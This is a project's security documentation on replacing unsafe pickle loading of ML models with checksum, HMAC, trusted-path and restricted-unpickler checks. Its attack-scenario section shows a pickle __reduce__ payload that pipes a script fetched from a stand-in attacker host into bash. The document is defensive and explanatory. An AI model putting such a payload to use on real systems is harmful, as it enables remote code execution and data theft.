# Model Security Documentation

**Version:** 1.0
**Last Updated:** 2025-11-18
**Severity:** CRITICAL

---

## Table of Contents

1. [Overview](#overview)
2. [Security Vulnerability Fixed](#security-vulnerability-fixed)
3. [Secure Deserialization Solution](#secure-deserialization-solution)
4. [Configuration](#configuration)
5. [Usage Guide](#usage-guide)
6. [Best Practices](#best-practices)
7. [Migration Guide](#migration-guide)
8. [Testing](#testing)
9. [Threat Model](#threat-model)
10. [References](#references)

---

## Overview

This document describes the **Secure Model Deserialization** system implemented to prevent remote code execution (RCE) vulnerabilities when loading ML models from storage.

### Critical Security Issue Fixed

**Vulnerability:** Unsafe deserialization via `pickle.load()`

**Risk Level:** CRITICAL (CVE-like severity)

**Attack Vector:** Remote Code Execution (RCE)

**Impact:** Complete system compromise if attacker can modify model files

---

## Security Vulnerability Fixed

### The Problem

The original implementation in `model_manager.py` used unsafe deserialization:

```python
# UNSAFE - DO NOT USE
with open(model_file, 'rb') as f:
    model = pickle.load(f)  # ❌ Arbitrary code execution risk
```

**Why This Is Dangerous:**

1. **Arbitrary Code Execution**: Python's `pickle` module can execute arbitrary code during deserialization
2. **No Integrity Verification**: No checksums or signatures to detect tampering
3. **No Access Controls**: Any file could be loaded from any location
4. **Supply Chain Attack**: Compromised model files can execute malicious code

**Attack Scenario:**

```python
# Attacker creates malicious model file
class MaliciousModel:
    def __reduce__(self):
        import os
        # Execute arbitrary commands during unpickling
        return (os.system, ('curl http://attacker.com/steal_data.sh | bash',))

# When victim loads the model...
pickle.dump(MaliciousModel(), open('model.pkl', 'wb'))

# System is compromised!
model = pickle.load(open('model.pkl', 'rb'))  # ❌ RCE occurs here
```

### Real-World Impact

- **Supply Chain Attacks**: Compromised model repositories
- **Insider Threats**: Malicious model uploads
- **Storage Compromise**: Tampered S3/GCS buckets
- **Man-in-the-Middle**: Intercepted model transfers

**Common Vulnerability Scoring System (CVSS):**
- Base Score: 9.8 (CRITICAL)
- Attack Vector: Network
- Attack Complexity: Low
- Privileges Required: None
- User Interaction: None
- Impact: Complete system compromise

---

## Secure Deserialization Solution

### Multi-Layered Security

The solution implements **defense-in-depth** with multiple security layers:

```
┌─────────────────────────────────────────────────┐
│   Layer 1: Trusted Storage Path Validation      │
│   Ensures model files come from trusted sources │
└────────────────────┬────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────┐
│   Layer 2: SHA256 Checksum Verification         │
│   Detects any tampering with model files        │
└────────────────────┬────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────┐
│   Layer 3: HMAC Signature Verification          │
│   Verifies model authenticity (optional)        │
└────────────────────┬────────────────────────────┘
                     │
┌────────────────────▼────────────────────────────┐
│   Layer 4: Restricted Unpickler                 │
│   Whitelists only safe ML classes               │
└────────────────────┬────────────────────────────┘
                     │
                     ▼
              Safe Model Loading
```

### 1. Trusted Storage Path Validation

Only allow models from approved storage locations:

```python
# Configure trusted paths
MODEL_TRUSTED_PATHS=/models/production,/models/staging

# Only models from these paths can be loaded
loader = SecureModelLoader()
loader.load_model('/models/production/model.pkl')  # ✅ Allowed
loader.load_model('/tmp/malicious.pkl')            # ❌ Blocked
```

### 2. SHA256 Checksum Verification

Every model must have a verified checksum:

```python
# metadata.json
{
    "checksum": "a3f5b2c1d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5",
    "checksum_algorithm": "sha256"
}

# Model loading verifies integrity
loader.load_model('model.pkl', 'metadata.json')
# ✅ Passes: Checksum matches
# ❌ Fails: ModelIntegrityError if tampered
```

**How It Works:**
1. Calculate SHA256 hash of model file
2. Compare with stored checksum in metadata
3. Reject if mismatch detected

**Protects Against:**
- File tampering
- Corruption during transfer
- Bit-flip attacks
- Storage compromise

### 3. HMAC Signature Verification (Optional)

Add cryptographic signatures for authenticity:

```python
# Enable signature verification
MODEL_VERIFY_SIGNATURE=true
MODEL_SIGNATURE_KEY=your-secret-signing-key-here

# metadata.json
{
    "checksum": "...",
    "signature": "b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5",
    "signature_algorithm": "hmac-sha256"
}
```

**Benefits:**
- Proves model was created by authorized party
- Prevents unauthorized model injection
- Uses constant-time comparison (prevents timing attacks)

### 4. Restricted Unpickler

Whitelist only safe ML classes:

```python
class RestrictedUnpickler(pickle.Unpickler):
    SAFE_MODULES = {'sklearn', 'numpy', 'pandas', 'statsmodels'}
    SAFE_CLASSES = {
        'sklearn.ensemble._iforest.IsolationForest',
        'numpy.ndarray',
        'pandas.core.frame.DataFrame',
    }

    def find_class(self, module, name):
        if module_is_safe(module, name):
            return super().find_class(module, name)
        raise UnpicklingError(f"Unsafe class: {module}.{name}")
```

**Protects Against:**
- Arbitrary code execution
- Malicious class loading
- Unexpected imports

---

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `MODEL_VERIFY_CHECKSUM` | `true` | Enable SHA256 checksum verification |
| `MODEL_VERIFY_SIGNATURE` | `false` | Enable HMAC signature verification |
| `MODEL_SIGNATURE_KEY` | `None` | Secret key for HMAC signing |
| `MODEL_TRUSTED_PATHS` | `""` | Comma-separated trusted storage paths |

### Recommended Production Configuration

```bash
# .env (production)
MODEL_VERIFY_CHECKSUM=true
MODEL_VERIFY_SIGNATURE=true
MODEL_SIGNATURE_KEY=<use-secrets-manager>
MODEL_TRUSTED_PATHS=/opt/models/production,/opt/models/staging

# Kubernetes Secret
kubectl create secret generic model-security \
  --from-literal=signature-key='<random-256-bit-key>' \
  -n blockchain-anomaly-detection
```

### Security Levels

**Level 1 - Basic (Development):**
```bash
MODEL_VERIFY_CHECKSUM=true
MODEL_VERIFY_SIGNATURE=false
MODEL_TRUSTED_PATHS=""
```

**Level 2 - Recommended (Staging):**
```bash
MODEL_VERIFY_CHECKSUM=true
MODEL_VERIFY_SIGNATURE=false
MODEL_TRUSTED_PATHS=/models/staging
```

**Level 3 - Maximum (Production):**
```bash
MODEL_VERIFY_CHECKSUM=true
MODEL_VERIFY_SIGNATURE=true
MODEL_SIGNATURE_KEY=<from-secrets-manager>
MODEL_TRUSTED_PATHS=/models/production
```

---

## Usage Guide

### Saving Models Securely

```python
from src.ml.security import SecureModelLoader
import pickle

# 1. Train and save model
model = IsolationForest(n_estimators=100)
model.fit(X_train)

model_file = '/models/production/model_v1.pkl'
with open(model_file, 'wb') as f:
    pickle.dump(model, f)

# 2. Generate security metadata
loader = SecureModelLoader()
metadata = loader.generate_metadata(
    model_file=model_file,
    existing_metadata={
        'model_type': 'IsolationForest',
        'version': '1.0.0',
        'trained_at': datetime.utcnow().isoformat(),
        'hyperparameters': {'n_estimators': 100}
    }
)

# 3. Save metadata with checksums/signatures
metadata_file = '/models/production/metadata.json'
with open(metadata_file, 'w') as f:
    json.dump(metadata, f, indent=2)

print(f"Model saved with checksum: {metadata['checksum'][:16]}...")
```

### Loading Models Securely

```python
from src.ml.security import SecureModelLoader, ModelIntegrityError

loader = SecureModelLoader()

try:
    # Load with automatic verification
    model = loader.load_model(
        model_file='/models/production/model_v1.pkl',
        metadata_file='/models/production/metadata.json'
    )

    # Model is safe to use
    predictions = model.predict(X_test)

except ModelIntegrityError as e:
    # Integrity verification failed - DO NOT USE MODEL
    logger.error(f"Model integrity check failed: {e}")
    alert_security_team(e)
    raise

except FileNotFoundError as e:
    # Model not found
    logger.error(f"Model file not found: {e}")
    raise
```

### Using ModelManager (Automatic Security)

The `ModelManager` class now uses `SecureModelLoader` automatically:

```python
from src.ml.deployment.model_manager import ModelManager

# Initialize (uses SecureModelLoader internally)
manager = ModelManager(db_session)

# Load model with automatic security verification
model = manager.get_model_for_prediction(
    model_id="isolation-forest",
    user_id="user123"
)

# Model has been verified - safe to use
predictions = model.predict(features)
```

---

## Best Practices

### 1. Model Storage Security

**DO:**
- ✅ Store models in dedicated, access-controlled storage
- ✅ Use cloud storage with encryption at rest (S3, GCS with KMS)
- ✅ Enable versioning on storage buckets
- ✅ Implement least-privilege access controls
- ✅ Audit all model access and modifications

**DON'T:**
- ❌ Store models in world-readable locations
- ❌ Use shared storage without access controls
- ❌ Allow anonymous uploads to model storage
- ❌ Disable encryption or versioning

### 2. Model Lifecycle Security

**DO:**
- ✅ Generate checksums immediately after training
- ✅ Store metadata with models (atomic operations)
- ✅ Use signatures for production models
- ✅ Validate models in CI/CD pipeline
- ✅ Implement model approval workflow

**DON'T:**
- ❌ Skip verification during development
- ❌ Reuse signature keys across environments
- ❌ Manually edit metadata files
- ❌ Deploy models without review

### 3. Incident Response

**If Integrity Check Fails:**

1. **Immediately stop model loading**
2. **Alert security team**
3. **Preserve evidence** (corrupted files)
4. **Investigate root cause**
5. **Restore from backup**
6. **Review access logs**

```python
try:
    model = loader.load_model(model_file, metadata_file)
except ModelIntegrityError as e:
    # DO NOT ignore this error!
    logger.critical(
        "SECURITY ALERT: Model integrity verification failed",
        extra={
            "model_file": model_file,
            "error": str(e),
            "timestamp": datetime.utcnow().isoformat()
        }
    )

    # Notify security team
    send_alert_to_security_team(
        severity="CRITICAL",
        message=f"Model tampering detected: {model_file}",
        details={"error": str(e)}
    )

    # Preserve evidence
    preserve_file_for_forensics(model_file)

    # Raise to prevent use of compromised model
    raise
```

### 4. Key Management

**Signature Key Security:**

- ✅ Generate 256-bit random keys: `openssl rand -hex 32`
- ✅ Store in secrets manager (AWS Secrets Manager, HashiCorp Vault)
- ✅ Rotate keys periodically (every 90 days)
- ✅ Use different keys per environment
- ✅ Never commit keys to version control

```bash
# Generate secure key
openssl rand -hex 32 > /dev/null

# Store in AWS Secrets Manager
aws secretsmanager create-secret \
  --name blockchain-anomaly/model-signature-key \
  --secret-string "$(openssl rand -hex 32)"

# Retrieve in application
export MODEL_SIGNATURE_KEY=$(aws secretsmanager get-secret-value \
  --secret-id blockchain-anomaly/model-signature-key \
  --query SecretString --output text)
```

### 5. Whitelisting Custom Classes

If you need to load custom model classes:

```python
from src.ml.security import SecureModelLoader

# Add custom safe class (use with caution!)
SecureModelLoader.add_safe_class('mypackage.models', 'CustomAnomalyDetector')

# Add custom safe module (use with extreme caution!)
SecureModelLoader.add_safe_module('mypackage')

# Only add classes you fully trust and control
```

---

## Migration Guide

### For Existing Deployments

**Step 1: Enable Checksum Verification**

```bash
# Update .env
MODEL_VERIFY_CHECKSUM=true
```

**Step 2: Generate Metadata for Existing Models**

```python
from src.ml.security import SecureModelLoader
import os
import json

loader = SecureModelLoader()

# List all existing models
model_files = [
    '/models/isolation_forest_v1.pkl',
    '/models/isolation_forest_v2.pkl',
    '/models/arima_v1.pkl',
]

for model_file in model_files:
    # Generate metadata
    metadata = loader.generate_metadata(model_file)

    # Save metadata
    metadata_file = model_file.replace('.pkl', '_metadata.json')
    with open(metadata_file, 'w') as f:
        json.dump(metadata, f, indent=2)

    print(f"Generated metadata for {model_file}")
```

**Step 3: Test Model Loading**

```python
# Verify all models can be loaded
for model_file in model_files:
    metadata_file = model_file.replace('.pkl', '_metadata.json')

    try:
        model = loader.load_model(model_file, metadata_file)
        print(f"✅ {model_file} loaded successfully")
    except Exception as e:
        print(f"❌ {model_file} failed: {e}")
```

**Step 4: Deploy and Monitor**

```bash
# Deploy updated code
kubectl apply -f k8s/api-deployment.yaml

# Monitor for integrity errors
kubectl logs -f deployment/api -n blockchain-anomaly-detection | grep "integrity"
```

**Step 5 (Optional): Enable Signatures**

```bash
# Generate signing key
export MODEL_SIGNATURE_KEY=$(openssl rand -hex 32)

# Update configuration
MODEL_VERIFY_SIGNATURE=true
MODEL_SIGNATURE_KEY=$MODEL_SIGNATURE_KEY

# Regenerate metadata with signatures
# (repeat Step 2)
```

---

## Testing

### Running Security Tests

```bash
# Run all security tests
pytest tests/test_secure_unpickler.py -v

# Run specific test categories
pytest tests/test_secure_unpickler.py::TestRestrictedUnpickler -v
pytest tests/test_secure_unpickler.py::TestSecureModelLoader -v

# Run with coverage
pytest tests/test_secure_unpickler.py --cov=src/ml/security --cov-report=html
```

### Test Coverage

The security test suite includes:

- ✅ Checksum verification (valid/invalid)
- ✅ Signature verification (valid/invalid)
- ✅ Restricted unpickler (safe/unsafe classes)
- ✅ Trusted path validation
- ✅ Metadata generation
- ✅ Tampered model detection
- ✅ Configuration handling
- ✅ Error handling
- ✅ Integration tests

### Manual Security Testing

```python
# Test 1: Malicious pickle detection
class MaliciousClass:
    def __reduce__(self):
        import os
        return (os.system, ('echo pwned',))

with open('malicious.pkl', 'wb') as f:
    pickle.dump(MaliciousClass(), f)

# Should raise UnpicklingError
loader.load_model('malicious.pkl', skip_verification=True)
# ✅ EXPECTED: UnpicklingError - Unsafe class not allowed

# Test 2: Tampered model detection
# Modify model file after generating checksum
with open('model.pkl', 'ab') as f:
    f.write(b'malicious')

# Should raise ModelIntegrityError
loader.load_model('model.pkl', 'metadata.json')
# ✅ EXPECTED: ModelIntegrityError - Checksum verification failed
```

---

## Threat Model

### Threats Mitigated

| Threat | Mitigation | Severity |
|--------|------------|----------|
| **Remote Code Execution** | Restricted unpickler | CRITICAL |
| **Model Tampering** | Checksum verification | HIGH |
| **Unauthorized Models** | Signature verification | HIGH |
| **Storage Compromise** | Trusted paths + checksums | HIGH |
| **Supply Chain Attack** | Full verification stack | CRITICAL |
| **Man-in-the-Middle** | Checksum + signature | MEDIUM |
| **Insider Threat** | Access controls + audit | MEDIUM |

### Residual Risks

| Risk | Likelihood | Impact | Mitigation Plan |
|------|------------|--------|-----------------|
| Compromised signing key | Low | High | Key rotation, secrets manager |
| Zero-day in ML library | Low | High | Dependency scanning, updates |
| Storage access compromise | Medium | High | IAM policies, MFA, audit logs |
| Physical access to servers | Low | Critical | Physical security, encryption |

---

## References

### Security Standards

- **OWASP Top 10**: A08:2021 - Software and Data Integrity Failures
- **CWE-502**: Deserialization of Untrusted Data
- **NIST SP 800-218**: Secure Software Development Framework (SSDF)
- **ISO 27001**: Information Security Management

### Related Documentation

- [SECURITY.md](../SECURITY.md) - Overall security policy
- [CONTRIBUTING.md](../CONTRIBUTING.md) - Secure development guidelines
- [API.md](API.md) - API security documentation

### External Resources

- [Python Pickle Security](https://docs.python.org/3/library/pickle.html#pickle-restrict)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [ML Model Security Best Practices](https://github.com/EthicalML/awesome-production-machine-learning#ml-security)

---

## Support

For security issues or questions:

- **Security Incidents**: Report immediately to security team
- **Implementation Help**: See [CLAUDE.md](../CLAUDE.md)
- **Bug Reports**: https://github.com/arec1b0/blockchain-anomaly-detection/issues

**IMPORTANT**: Do not create public issues for security vulnerabilities. Contact the security team directly.

---

**Document Version:** 1.0
**Last Review:** 2025-11-18
**Next Review:** 2026-02-18 (90 days)
